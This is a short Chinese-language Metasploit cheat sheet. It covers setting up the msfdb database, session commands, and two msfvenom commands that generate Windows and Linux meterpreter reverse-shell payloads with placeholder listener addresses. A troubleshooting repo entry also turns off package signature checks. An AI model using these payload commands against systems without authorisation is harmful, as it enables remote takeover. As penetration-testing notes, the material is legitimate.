# Metasploit

## 数据库

初次使用 MSF 时可以利用 [msfdb](https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html) 对数据库进行自动初始化, 若自动初始化失败则进行[手动初始化](https://docs.rapid7.com/metasploit/managing-the-database/). 仅支持 [PostgreSQL](https://www.postgresql.org/) 数据库.  

```sh
sudo pacman -S postgresql                      # 安装数据库
sudo systemctl enable --now postgresql.service # 启用数据库服务
sudo systemctl status postgresql.service       # 检查数据库服务状态

msfdb status # 检查数据库服务状态, 包括监听端口
msfdb init   # 初始化数据库
```

其中启动数据库服务和初始化数据库的步骤容易出现错误, 根据提示信息进行故障排除即可.  
启动 msfconsole 后可以通过 `db_status` 检查数据库连接状态.  

之后便可以使用数据库相关指令, 关键信息会被记录到数据库中以便后续查询.  

## Msfvenom

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=[ip] rc4password=[password] -f exe -o ~/payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp       LHOST=[ip]                        -f elf -o ~/payload
```

## 后渗透测试

```sh
sessions         # 列出会话, -l
sessions [id]    # 打开会话, -i
sessions -u [id] # 将 shell 升级到 meterpreter
```

## 故障排除

msfdb 初始化数据库失败. 可以使用下面的源安装 `msfdb-blackarch`:  

```
[blackarch]
SigLevel = Optional TrustAll
Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch
```

## 拓展

- <https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/>
